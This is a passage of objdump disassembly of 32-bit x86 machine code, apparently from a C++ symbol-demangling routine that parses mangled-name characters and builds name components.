  402c0a:	89 44 24 24          	mov    %eax,0x24(%esp)
  402c0e:	89 c7                	mov    %eax,%edi
  402c10:	e9 5b fe ff ff       	jmp    0x402a70
  402c15:	8d 76 00             	lea    0x0(%esi),%esi
  402c18:	83 c6 01             	add    $0x1,%esi
  402c1b:	89 d8                	mov    %ebx,%eax
  402c1d:	89 73 0c             	mov    %esi,0xc(%ebx)
  402c20:	e8 eb f8 ff ff       	call   0x402510
  402c25:	89 44 24 24          	mov    %eax,0x24(%esp)
  402c29:	89 c6                	mov    %eax,%esi
  402c2b:	8b 43 0c             	mov    0xc(%ebx),%eax
  402c2e:	80 38 49             	cmpb   $0x49,(%eax)
  402c31:	0f 84 70 05 00 00    	je     0x4031a7
  402c37:	89 d8                	mov    %ebx,%eax
  402c39:	e8 c2 fc ff ff       	call   0x402900
  402c3e:	89 34 24             	mov    %esi,(%esp)
  402c41:	ba 22 00 00 00       	mov    $0x22,%edx
  402c46:	89 c1                	mov    %eax,%ecx
  402c48:	89 d8                	mov    %ebx,%eax
  402c4a:	e8 71 ee ff ff       	call   0x401ac0
  402c4f:	89 44 24 24          	mov    %eax,0x24(%esp)
  402c53:	89 c7                	mov    %eax,%edi
  402c55:	e9 16 fe ff ff       	jmp    0x402a70
  402c5a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402c60:	83 c6 01             	add    $0x1,%esi
  402c63:	89 d8                	mov    %ebx,%eax
  402c65:	89 73 0c             	mov    %esi,0xc(%ebx)
  402c68:	e8 93 fc ff ff       	call   0x402900
  402c6d:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402c74:	ba 27 00 00 00       	mov    $0x27,%edx
  402c79:	89 c1                	mov    %eax,%ecx
  402c7b:	89 d8                	mov    %ebx,%eax
  402c7d:	e8 3e ee ff ff       	call   0x401ac0
  402c82:	89 44 24 24          	mov    %eax,0x24(%esp)
  402c86:	89 c7                	mov    %eax,%edi
  402c88:	e9 e3 fd ff ff       	jmp    0x402a70
  402c8d:	8d 76 00             	lea    0x0(%esi),%esi
  402c90:	83 c6 01             	add    $0x1,%esi
  402c93:	89 d8                	mov    %ebx,%eax
  402c95:	89 73 0c             	mov    %esi,0xc(%ebx)
  402c98:	e8 63 fc ff ff       	call   0x402900
  402c9d:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402ca4:	ba 25 00 00 00       	mov    $0x25,%edx
  402ca9:	89 c1                	mov    %eax,%ecx
  402cab:	89 d8                	mov    %ebx,%eax
  402cad:	e8 0e ee ff ff       	call   0x401ac0
  402cb2:	89 44 24 24          	mov    %eax,0x24(%esp)
  402cb6:	89 c7                	mov    %eax,%edi
  402cb8:	e9 b3 fd ff ff       	jmp    0x402a70
  402cbd:	8d 76 00             	lea    0x0(%esi),%esi
  402cc0:	8d 56 01             	lea    0x1(%esi),%edx
  402cc3:	89 53 0c             	mov    %edx,0xc(%ebx)
  402cc6:	0f b6 46 01          	movzbl 0x1(%esi),%eax
  402cca:	3c 5f                	cmp    $0x5f,%al
  402ccc:	0f 84 ce 04 00 00    	je     0x4031a0
  402cd2:	83 e8 30             	sub    $0x30,%eax
  402cd5:	3c 09                	cmp    $0x9,%al
  402cd7:	0f 87 ef 04 00 00    	ja     0x4031cc
  402cdd:	89 d7                	mov    %edx,%edi
  402cdf:	90                   	nop
  402ce0:	89 fd                	mov    %edi,%ebp
  402ce2:	83 c7 01             	add    $0x1,%edi
  402ce5:	89 7b 0c             	mov    %edi,0xc(%ebx)
  402ce8:	0f b6 07             	movzbl (%edi),%eax
  402ceb:	83 e8 30             	sub    $0x30,%eax
  402cee:	3c 09                	cmp    $0x9,%al
  402cf0:	76 ee                	jbe    0x402ce0
  402cf2:	89 e9                	mov    %ebp,%ecx
  402cf4:	89 d8                	mov    %ebx,%eax
  402cf6:	29 f1                	sub    %esi,%ecx
  402cf8:	e8 d3 ee ff ff       	call   0x401bd0
  402cfd:	89 c6                	mov    %eax,%esi
  402cff:	85 c0                	test   %eax,%eax
  402d01:	0f 84 f9 fc ff ff    	je     0x402a00
  402d07:	0f b6 45 01          	movzbl 0x1(%ebp),%eax
  402d0b:	89 fa                	mov    %edi,%edx
  402d0d:	3c 5f                	cmp    $0x5f,%al
  402d0f:	0f 85 eb fc ff ff    	jne    0x402a00
  402d15:	83 c2 01             	add    $0x1,%edx
  402d18:	89 d8                	mov    %ebx,%eax
  402d1a:	89 53 0c             	mov    %edx,0xc(%ebx)
  402d1d:	e8 de fb ff ff       	call   0x402900
  402d22:	89 f1                	mov    %esi,%ecx
  402d24:	ba 2b 00 00 00       	mov    $0x2b,%edx
  402d29:	89 04 24             	mov    %eax,(%esp)
  402d2c:	89 d8                	mov    %ebx,%eax
  402d2e:	e8 8d ed ff ff       	call   0x401ac0
  402d33:	89 44 24 24          	mov    %eax,0x24(%esp)
  402d37:	89 c7                	mov    %eax,%edi
  402d39:	e9 32 fd ff ff       	jmp    0x402a70
  402d3e:	66 90                	xchg   %ax,%ax
  402d40:	83 c6 01             	add    $0x1,%esi
  402d43:	89 d8                	mov    %ebx,%eax
  402d45:	89 73 0c             	mov    %esi,0xc(%ebx)
  402d48:	e8 b3 fb ff ff       	call   0x402900
  402d4d:	89 c6                	mov    %eax,%esi
  402d4f:	85 c0                	test   %eax,%eax
  402d51:	0f 84 a9 fc ff ff    	je     0x402a00
  402d57:	89 d8                	mov    %ebx,%eax
  402d59:	e8 a2 fb ff ff       	call   0x402900
  402d5e:	85 c0                	test   %eax,%eax
  402d60:	0f 84 9a fc ff ff    	je     0x402a00
  402d66:	89 04 24             	mov    %eax,(%esp)
  402d69:	89 f1                	mov    %esi,%ecx
  402d6b:	ba 2c 00 00 00       	mov    $0x2c,%edx
  402d70:	89 d8                	mov    %ebx,%eax
  402d72:	e8 49 ed ff ff       	call   0x401ac0
  402d77:	89 44 24 24          	mov    %eax,0x24(%esp)
  402d7b:	89 c7                	mov    %eax,%edi
  402d7d:	e9 ee fc ff ff       	jmp    0x402a70
  402d82:	89 d8                	mov    %ebx,%eax
  402d84:	e8 a7 ee ff ff       	call   0x401c30
  402d89:	89 c1                	mov    %eax,%ecx
  402d8b:	8b 43 0c             	mov    0xc(%ebx),%eax
  402d8e:	0f b6 10             	movzbl (%eax),%edx
  402d91:	80 fa 62             	cmp    $0x62,%dl
  402d94:	0f 84 ed 04 00 00    	je     0x403287
  402d9a:	80 fa 78             	cmp    $0x78,%dl
  402d9d:	74 0b                	je     0x402daa
  402d9f:	80 fa 5f             	cmp    $0x5f,%dl
  402da2:	0f 85 58 fc ff ff    	jne    0x402a00
  402da8:	31 d2                	xor    %edx,%edx
  402daa:	8b 73 14             	mov    0x14(%ebx),%esi
  402dad:	83 c0 01             	add    $0x1,%eax
  402db0:	3b 73 18             	cmp    0x18(%ebx),%esi
  402db3:	0f 8d e3 9d 02 00    	jge    0x42cb9c
  402db9:	6b fe 14             	imul   $0x14,%esi,%edi
  402dbc:	31 ed                	xor    %ebp,%ebp
  402dbe:	03 7b 10             	add    0x10(%ebx),%edi
  402dc1:	83 c6 01             	add    $0x1,%esi
  402dc4:	89 6f 04             	mov    %ebp,0x4(%edi)
  402dc7:	89 6f 08             	mov    %ebp,0x8(%edi)
  402dca:	89 73 14             	mov    %esi,0x14(%ebx)
  402dcd:	8d 74 24 24          	lea    0x24(%esp),%esi
  402dd1:	66 89 4f 10          	mov    %cx,0x10(%edi)
  402dd5:	88 57 12             	mov    %dl,0x12(%edi)
  402dd8:	c7 07 5f 00 00 00    	movl   $0x5f,(%edi)
  402dde:	c7 47 0c 08 0d 43 00 	movl   $0x430d08,0xc(%edi)
  402de5:	89 43 0c             	mov    %eax,0xc(%ebx)
  402de8:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  402dec:	89 34 24             	mov    %esi,(%esp)
  402def:	c7 44 24 04 e8 f5 42 	movl   $0x42f5e8,0x4(%esp)
  402df6:	00 
  402df7:	88 54 24 18          	mov    %dl,0x18(%esp)
  402dfb:	e8 80 f2 ff ff       	call   0x402080
  402e00:	89 34 24             	mov    %esi,(%esp)
  402e03:	e8 70 57 01 00       	call   0x418578
  402e08:	8b 77 0c             	mov    0xc(%edi),%esi
  402e0b:	0f b6 54 24 18       	movzbl 0x18(%esp),%edx
  402e10:	89 c1                	mov    %eax,%ecx
  402e12:	8b 43 2c             	mov    0x2c(%ebx),%eax
  402e15:	03 46 04             	add    0x4(%esi),%eax
  402e18:	80 fa 01             	cmp    $0x1,%dl
  402e1b:	83 d8 ff             	sbb    $0xffffffff,%eax
  402e1e:	01 c8                	add    %ecx,%eax
  402e20:	89 43 2c             	mov    %eax,0x2c(%ebx)
  402e23:	e9 da fb ff ff       	jmp    0x402a02
  402e28:	8b 43 14             	mov    0x14(%ebx),%eax
  402e2b:	3b 43 18             	cmp    0x18(%ebx),%eax
  402e2e:	0f 8d cc fb ff ff    	jge    0x402a00
  402e34:	8b 53 10             	mov    0x10(%ebx),%edx
  402e37:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  402e3a:	83 c0 01             	add    $0x1,%eax
  402e3d:	89 43 14             	mov    %eax,0x14(%ebx)
  402e40:	8d 3c 8a             	lea    (%edx,%ecx,4),%edi
  402e43:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  402e4a:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%edi)
  402e51:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  402e57:	c7 47 0c e4 f6 42 00 	movl   $0x42f6e4,0xc(%edi)
  402e5e:	c7 47 10 0e 00 00 00 	movl   $0xe,0x10(%edi)
  402e65:	e9 98 fb ff ff       	jmp    0x402a02
  402e6a:	80 7e 02 5f          	cmpb   $0x5f,0x2(%esi)
  402e6e:	0f 84 ea 03 00 00    	je     0x40325e
  402e74:	8b 43 14             	mov    0x14(%ebx),%eax
  402e77:	3b 43 18             	cmp    0x18(%ebx),%eax
  402e7a:	0f 8d 80 fb ff ff    	jge    0x402a00
  402e80:	8b 53 10             	mov    0x10(%ebx),%edx
  402e83:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  402e86:	83 c0 01             	add    $0x1,%eax
  402e89:	8d 34 8a             	lea    (%edx,%ecx,4),%esi
  402e8c:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  402e93:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  402e9a:	89 43 14             	mov    %eax,0x14(%ebx)
  402e9d:	89 d8                	mov    %ebx,%eax
  402e9f:	c7 06 44 00 00 00    	movl   $0x44,(%esi)
  402ea5:	e8 86 ed ff ff       	call   0x401c30
  402eaa:	89 46 0c             	mov    %eax,0xc(%esi)
  402ead:	8b 43 0c             	mov    0xc(%ebx),%eax
  402eb0:	80 38 5f             	cmpb   $0x5f,(%eax)
  402eb3:	0f 85 47 fb ff ff    	jne    0x402a00
  402eb9:	83 c0 01             	add    $0x1,%eax
  402ebc:	89 43 0c             	mov    %eax,0xc(%ebx)
  402ebf:	89 d8                	mov    %ebx,%eax
  402ec1:	e8 3a fa ff ff       	call   0x402900
  402ec6:	89 f1                	mov    %esi,%ecx
  402ec8:	ba 2e 00 00 00       	mov    $0x2e,%edx
  402ecd:	89 04 24             	mov    %eax,(%esp)
  402ed0:	89 d8                	mov    %ebx,%eax
  402ed2:	e8 e9 eb ff ff       	call   0x401ac0
  402ed7:	89 44 24 24          	mov    %eax,0x24(%esp)
  402edb:	89 c7                	mov    %eax,%edi
  402edd:	e9 8e fb ff ff       	jmp    0x402a70
  402ee2:	8b 43 14             	mov    0x14(%ebx),%eax
  402ee5:	3b 43 18             	cmp    0x18(%ebx),%eax
  402ee8:	0f 8d c9 9c 02 00    	jge    0x42cbb7
  402eee:	8b 53 10             	mov    0x10(%ebx),%edx
  402ef1:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  402ef4:	83 c0 01             	add    $0x1,%eax
  402ef7:	8d 3c 8a             	lea    (%edx,%ecx,4),%edi
  402efa:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  402f01:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%edi)
  402f08:	89 43 14             	mov    %eax,0x14(%ebx)
  402f0b:	c7 07 28 00 00 00    	movl   $0x28,(%edi)
  402f11:	c7 47 0c b8 0c 43 00 	movl   $0x430cb8,0xc(%edi)
  402f18:	83 43 2c 07          	addl   $0x7,0x2c(%ebx)
  402f1c:	e9 e1 fa ff ff       	jmp    0x402a02
  402f21:	8b 43 14             	mov    0x14(%ebx),%eax
  402f24:	3b 43 18             	cmp    0x18(%ebx),%eax
  402f27:	0f 8d 8a 9c 02 00    	jge    0x42cbb7
  402f2d:	8b 53 10             	mov    0x10(%ebx),%edx
  402f30:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  402f33:	83 c0 01             	add    $0x1,%eax
  402f36:	8d 3c 8a             	lea    (%edx,%ecx,4),%edi
  402f39:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  402f40:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%edi)
  402f47:	89 43 14             	mov    %eax,0x14(%ebx)
  402f4a:	c7 07 28 00 00 00    	movl   $0x28,(%edi)
  402f50:	c7 47 0c cc 0c 43 00 	movl   $0x430ccc,0xc(%edi)
  402f57:	83 43 2c 08          	addl   $0x8,0x2c(%ebx)
  402f5b:	e9 a2 fa ff ff       	jmp    0x402a02
  402f60:	8b 43 14             	mov    0x14(%ebx),%eax
  402f63:	3b 43 18             	cmp    0x18(%ebx),%eax
  402f66:	0f 8d 4b 9c 02 00    	jge    0x42cbb7
  402f6c:	8b 53 10             	mov    0x10(%ebx),%edx
  402f6f:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  402f72:	83 c0 01             	add    $0x1,%eax
  402f75:	8d 3c 8a             	lea    (%edx,%ecx,4),%edi
  402f78:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  402f7f:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%edi)
  402f86:	89 43 14             	mov    %eax,0x14(%ebx)
  402f89:	c7 07 28 00 00 00    	movl   $0x28,(%edi)
  402f8f:	c7 47 0c a4 0c 43 00 	movl   $0x430ca4,0xc(%edi)
  402f96:	83 43 2c 04          	addl   $0x4,0x2c(%ebx)
  402f9a:	e9 63 fa ff ff       	jmp    0x402a02
  402f9f:	8b 43 14             	mov    0x14(%ebx),%eax
  402fa2:	3b 43 18             	cmp    0x18(%ebx),%eax
  402fa5:	0f 8d 0c 9c 02 00    	jge    0x42cbb7
  402fab:	8b 53 10             	mov    0x10(%ebx),%edx
  402fae:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  402fb1:	83 c0 01             	add    $0x1,%eax
  402fb4:	8d 3c 8a             	lea    (%edx,%ecx,4),%edi
  402fb7:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  402fbe:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%edi)
  402fc5:	89 43 14             	mov    %eax,0x14(%ebx)
  402fc8:	c7 07 28 00 00 00    	movl   $0x28,(%edi)
  402fce:	c7 47 0c 68 0c 43 00 	movl   $0x430c68,0xc(%edi)
  402fd5:	83 43 2c 09          	addl   $0x9,0x2c(%ebx)
  402fd9:	e9 24 fa ff ff       	jmp    0x402a02
  402fde:	8b 43 14             	mov    0x14(%ebx),%eax
  402fe1:	3b 43 18             	cmp    0x18(%ebx),%eax
  402fe4:	0f 8d cd 9b 02 00    	jge    0x42cbb7
  402fea:	8b 53 10             	mov    0x10(%ebx),%edx
  402fed:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  402ff0:	83 c0 01             	add    $0x1,%eax
  402ff3:	8d 3c 8a             	lea    (%edx,%ecx,4),%edi
  402ff6:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  402ffd:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%edi)
  403004:	89 43 14             	mov    %eax,0x14(%ebx)
  403007:	c7 07 28 00 00 00    	movl   $0x28,(%edi)
  40300d:	c7 47 0c 90 0c 43 00 	movl   $0x430c90,0xc(%edi)
  403014:	83 43 2c 0a          	addl   $0xa,0x2c(%ebx)
  403018:	e9 e5 f9 ff ff       	jmp    0x402a02
  40301d:	8b 43 14             	mov    0x14(%ebx),%eax
  403020:	3b 43 18             	cmp    0x18(%ebx),%eax
  403023:	0f 8d 8e 9b 02 00    	jge    0x42cbb7
  403029:	8b 53 10             	mov    0x10(%ebx),%edx
  40302c:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  40302f:	83 c0 01             	add    $0x1,%eax
  403032:	8d 3c 8a             	lea    (%edx,%ecx,4),%edi
  403035:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  40303c:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%edi)
  403043:	89 43 14             	mov    %eax,0x14(%ebx)
  403046:	c7 07 28 00 00 00    	movl   $0x28,(%edi)
  40304c:	c7 47 0c 7c 0c 43 00 	movl   $0x430c7c,0xc(%edi)
  403053:	83 43 2c 09          	addl   $0x9,0x2c(%ebx)
  403057:	e9 a6 f9 ff ff       	jmp    0x402a02
  40305c:	8b 43 14             	mov    0x14(%ebx),%eax
  40305f:	3b 43 18             	cmp    0x18(%ebx),%eax
  403062:	0f 8d 98 f9 ff ff    	jge    0x402a00
  403068:	8b 53 10             	mov    0x10(%ebx),%edx
  40306b:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  40306e:	83 c0 01             	add    $0x1,%eax
  403071:	89 43 14             	mov    %eax,0x14(%ebx)
  403074:	8d 3c 8a             	lea    (%edx,%ecx,4),%edi
  403077:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  40307e:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%edi)
  403085:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  40308b:	c7 47 0c df f6 42 00 	movl   $0x42f6df,0xc(%edi)
  403092:	c7 47 10 04 00 00 00 	movl   $0x4,0x10(%edi)
  403099:	e9 64 f9 ff ff       	jmp    0x402a02
  40309e:	8b 43 14             	mov    0x14(%ebx),%eax
  4030a1:	3b 43 18             	cmp    0x18(%ebx),%eax
  4030a4:	0f 8d 0d 9b 02 00    	jge    0x42cbb7
  4030aa:	8b 53 10             	mov    0x10(%ebx),%edx
  4030ad:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  4030b0:	83 c0 01             	add    $0x1,%eax
  4030b3:	8d 3c 8a             	lea    (%edx,%ecx,4),%edi
  4030b6:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  4030bd:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%edi)
  4030c4:	89 43 14             	mov    %eax,0x14(%ebx)
  4030c7:	c7 07 28 00 00 00    	movl   $0x28,(%edi)
  4030cd:	c7 47 0c f4 0c 43 00 	movl   $0x430cf4,0xc(%edi)
  4030d4:	83 43 2c 11          	addl   $0x11,0x2c(%ebx)
  4030d8:	e9 25 f9 ff ff       	jmp    0x402a02
  4030dd:	8b 43 14             	mov    0x14(%ebx),%eax
  4030e0:	3b 43 18             	cmp    0x18(%ebx),%eax
  4030e3:	0f 8d ce 9a 02 00    	jge    0x42cbb7
  4030e9:	8b 53 10             	mov    0x10(%ebx),%edx
  4030ec:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  4030ef:	83 c0 01             	add    $0x1,%eax
  4030f2:	8d 3c 8a             	lea    (%edx,%ecx,4),%edi
  4030f5:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  4030fc:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%edi)
  403103:	89 43 14             	mov    %eax,0x14(%ebx)
  403106:	c7 07 28 00 00 00    	movl   $0x28,(%edi)
  40310c:	c7 47 0c e0 0c 43 00 	movl   $0x430ce0,0xc(%edi)
  403113:	83 43 2c 08          	addl   $0x8,0x2c(%ebx)
  403117:	e9 e6 f8 ff ff       	jmp    0x402a02
  40311c:	89 d8                	mov    %ebx,%eax
  40311e:	e8 dd f7 ff ff       	call   0x402900
  403123:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40312a:	ba 4d 00 00 00       	mov    $0x4d,%edx
  40312f:	89 c1                	mov    %eax,%ecx
  403131:	89 d8                	mov    %ebx,%eax
  403133:	e8 88 e9 ff ff       	call   0x401ac0
  403138:	89 44 24 24          	mov    %eax,0x24(%esp)
  40313c:	89 c7                	mov    %eax,%edi
  40313e:	e9 2d f9 ff ff       	jmp    0x402a70
  403143:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  403147:	90                   	nop
  403148:	8d 84 80 1b fe ff ff 	lea    -0x1e5(%eax,%eax,4),%eax
  40314f:	8d 14 85 60 0a 43 00 	lea    0x430a60(,%eax,4),%edx
  403156:	8b 43 14             	mov    0x14(%ebx),%eax
  403159:	3b 43 18             	cmp    0x18(%ebx),%eax
  40315c:	0f 8d 55 9a 02 00    	jge    0x42cbb7
  403162:	8b 4b 10             	mov    0x10(%ebx),%ecx
  403165:	8d 3c 80             	lea    (%eax,%eax,4),%edi
  403168:	83 c6 01             	add    $0x1,%esi
  40316b:	83 c0 01             	add    $0x1,%eax
  40316e:	8d 3c b9             	lea    (%ecx,%edi,4),%edi
  403171:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  403178:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%edi)
  40317f:	89 43 14             	mov    %eax,0x14(%ebx)
  403182:	8b 42 04             	mov    0x4(%edx),%eax
  403185:	c7 07 28 00 00 00    	movl   $0x28,(%edi)
  40318b:	89 57 0c             	mov    %edx,0xc(%edi)
  40318e:	01 43 2c             	add    %eax,0x2c(%ebx)
  403191:	89 73 0c             	mov    %esi,0xc(%ebx)
  403194:	e9 69 f8 ff ff       	jmp    0x402a02
  403199:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4031a0:	31 f6                	xor    %esi,%esi
  4031a2:	e9 6e fb ff ff       	jmp    0x402d15
  4031a7:	83 c0 01             	add    $0x1,%eax
  4031aa:	89 43 0c             	mov    %eax,0xc(%ebx)
  4031ad:	89 d8                	mov    %ebx,%eax
  4031af:	e8 9c 0e 00 00       	call   0x404050
  4031b4:	89 f1                	mov    %esi,%ecx
  4031b6:	ba 04 00 00 00       	mov    $0x4,%edx
  4031bb:	89 04 24             	mov    %eax,(%esp)
  4031be:	89 d8                	mov    %ebx,%eax
  4031c0:	e8 fb e8 ff ff       	call   0x401ac0
  4031c5:	89 c6                	mov    %eax,%esi
  4031c7:	e9 6b fa ff ff       	jmp    0x402c37
  4031cc:	8b 7b 30             	mov    0x30(%ebx),%edi
  4031cf:	c7 43 30 01 00 00 00 	movl   $0x1,0x30(%ebx)
  4031d6:	89 d8                	mov    %ebx,%eax
  4031d8:	e8 e3 10 00 00       	call   0x4042c0
  4031dd:	89 7b 30             	mov    %edi,0x30(%ebx)
  4031e0:	89 c6                	mov    %eax,%esi
  4031e2:	85 c0                	test   %eax,%eax
  4031e4:	0f 84 16 f8 ff ff    	je     0x402a00
  4031ea:	8b 7b 0c             	mov    0xc(%ebx),%edi
  4031ed:	0f b6 07             	movzbl (%edi),%eax
  4031f0:	e9 16 fb ff ff       	jmp    0x402d0b
  4031f5:	8b 43 14             	mov    0x14(%ebx),%eax
  4031f8:	8b 73 2c             	mov    0x2c(%ebx),%esi
  4031fb:	89 44 24 18          	mov    %eax,0x18(%esp)
  4031ff:	8b 43 20             	mov    0x20(%ebx),%eax
  403202:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403206:	8d 45 01             	lea    0x1(%ebp),%eax
  403209:	89 43 0c             	mov    %eax,0xc(%ebx)
  40320c:	89 d8                	mov    %ebx,%eax
  40320e:	e8 3d 0e 00 00       	call   0x404050
  403213:	89 c2                	mov    %eax,%edx
  403215:	8b 43 0c             	mov    0xc(%ebx),%eax
  403218:	80 38 49             	cmpb   $0x49,(%eax)
  40321b:	74 19                	je     0x403236
  40321d:	8b 44 24 18          	mov    0x18(%esp),%eax
  403221:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  403224:	89 73 2c             	mov    %esi,0x2c(%ebx)
  403227:	89 43 14             	mov    %eax,0x14(%ebx)
  40322a:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40322e:	89 43 20             	mov    %eax,0x20(%ebx)
  403231:	e9 3a f8 ff ff       	jmp    0x402a70
  403236:	85 ff                	test   %edi,%edi
  403238:	0f 84 c2 f7 ff ff    	je     0x402a00
  40323e:	8b 43 20             	mov    0x20(%ebx),%eax
  403241:	3b 43 24             	cmp    0x24(%ebx),%eax
  403244:	0f 8d b6 f7 ff ff    	jge    0x402a00
  40324a:	8b 4b 1c             	mov    0x1c(%ebx),%ecx
  40324d:	89 3c 81             	mov    %edi,(%ecx,%eax,4)
  403250:	83 c0 01             	add    $0x1,%eax
  403253:	89 43 20             	mov    %eax,0x20(%ebx)
  403256:	89 14 24             	mov    %edx,(%esp)
  403259:	e9 9e f9 ff ff       	jmp    0x402bfc
  40325e:	83 c6 03             	add    $0x3,%esi
  403261:	8b 7b 30             	mov    0x30(%ebx),%edi
  403264:	c7 43 30 01 00 00 00 	movl   $0x1,0x30(%ebx)
  40326b:	89 d8                	mov    %ebx,%eax
  40326d:	89 73 0c             	mov    %esi,0xc(%ebx)
  403270:	e8 4b 10 00 00       	call   0x4042c0
  403275:	89 7b 30             	mov    %edi,0x30(%ebx)
  403278:	89 c6                	mov    %eax,%esi
  40327a:	85 c0                	test   %eax,%eax
  40327c:	0f 85 2b fc ff ff    	jne    0x402ead
  403282:	e9 79 f7 ff ff       	jmp    0x402a00
  403287:	83 f9 10             	cmp    $0x10,%ecx
  40328a:	0f 85 70 f7 ff ff    	jne    0x402a00
  403290:	83 c0 01             	add    $0x1,%eax
  403293:	89 43 0c             	mov    %eax,0xc(%ebx)
  403296:	8b 43 14             	mov    0x14(%ebx),%eax
  403299:	3b 43 18             	cmp    0x18(%ebx),%eax
  40329c:	0f 8d 15 99 02 00    	jge    0x42cbb7
  4032a2:	6b f8 14             	imul   $0x14,%eax,%edi
  4032a5:	31 d2                	xor    %edx,%edx
  4032a7:	03 7b 10             	add    0x10(%ebx),%edi
  4032aa:	83 c0 01             	add    $0x1,%eax
  4032ad:	89 57 04             	mov    %edx,0x4(%edi)
  4032b0:	89 57 08             	mov    %edx,0x8(%edi)
  4032b3:	89 43 14             	mov    %eax,0x14(%ebx)
  4032b6:	8b 43 2c             	mov    0x2c(%ebx),%eax
  4032b9:	c7 07 28 00 00 00    	movl   $0x28,(%edi)
  4032bf:	c7 47 0c 1c 0d 43 00 	movl   $0x430d1c,0xc(%edi)
  4032c6:	83 c0 0f             	add    $0xf,%eax
  4032c9:	e9 52 fb ff ff       	jmp    0x402e20
  4032ce:	66 90                	xchg   %ax,%ax
  4032d0:	56                   	push   %esi
  4032d1:	53                   	push   %ebx
  4032d2:	89 c3                	mov    %eax,%ebx
  4032d4:	83 ec 24             	sub    $0x24,%esp
  4032d7:	8b 53 0c             	mov    0xc(%ebx),%edx
  4032da:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  4032e1:	00 
  4032e2:	8d 74 24 1c          	lea    0x1c(%esp),%esi
  4032e6:	0f b6 02             	movzbl (%edx),%eax
  4032e9:	84 c0                	test   %al,%al
  4032eb:	74 4c                	je     0x403339
  4032ed:	83 e8 2e             	sub    $0x2e,%eax
  4032f0:	3c 24                	cmp    $0x24,%al
  4032f2:	77 12                	ja     0x403306
  4032f4:	0f b6 c0             	movzbl %al,%eax
  4032f7:	ff 24 85 0c f8 42 00 	jmp    *0x42f80c(,%eax,4)
  4032fe:	66 90                	xchg   %ax,%ax
  403300:	80 7a 01 45          	cmpb   $0x45,0x1(%edx)
  403304:	74 33                	je     0x403339
  403306:	89 d8                	mov    %ebx,%eax
  403308:	e8 f3 f5 ff ff       	call   0x402900
  40330d:	89 c1                	mov    %eax,%ecx
  40330f:	85 c0                	test   %eax,%eax
  403311:	74 5d                	je     0x403370
  403313:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40331a:	ba 2f 00 00 00       	mov    $0x2f,%edx
  40331f:	89 d8                	mov    %ebx,%eax
  403321:	e8 9a e7 ff ff       	call   0x401ac0
  403326:	89 06                	mov    %eax,(%esi)
  403328:	85 c0                	test   %eax,%eax
  40332a:	74 44                	je     0x403370
  40332c:	8b 53 0c             	mov    0xc(%ebx),%edx
  40332f:	8d 70 10             	lea    0x10(%eax),%esi
  403332:	0f b6 02             	movzbl (%edx),%eax
  403335:	84 c0                	test   %al,%al
  403337:	75 b4                	jne    0x4032ed
  403339:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40333d:	85 c0                	test   %eax,%eax
  40333f:	74 2f                	je     0x403370
  403341:	8b 50 10             	mov    0x10(%eax),%edx
  403344:	85 d2                	test   %edx,%edx
  403346:	74 08                	je     0x403350
  403348:	83 c4 24             	add    $0x24,%esp
  40334b:	5b                   	pop    %ebx
  40334c:	5e                   	pop    %esi
  40334d:	c3                   	ret
  40334e:	66 90                	xchg   %ax,%ax
  403350:	8b 50 0c             	mov    0xc(%eax),%edx
  403353:	83 3a 28             	cmpl   $0x28,(%edx)
  403356:	75 f0                	jne    0x403348
  403358:	8b 52 0c             	mov    0xc(%edx),%edx
  40335b:	83 7a 10 09          	cmpl   $0x9,0x10(%edx)
  40335f:	75 e7                	jne    0x403348
  403361:	8b 52 04             	mov    0x4(%edx),%edx
  403364:	29 53 2c             	sub    %edx,0x2c(%ebx)
  403367:	c7 40 0c 00 00 00 00 	movl   $0x0,0xc(%eax)
  40336e:	eb d8                	jmp    0x403348
  403370:	83 c4 24             	add    $0x24,%esp
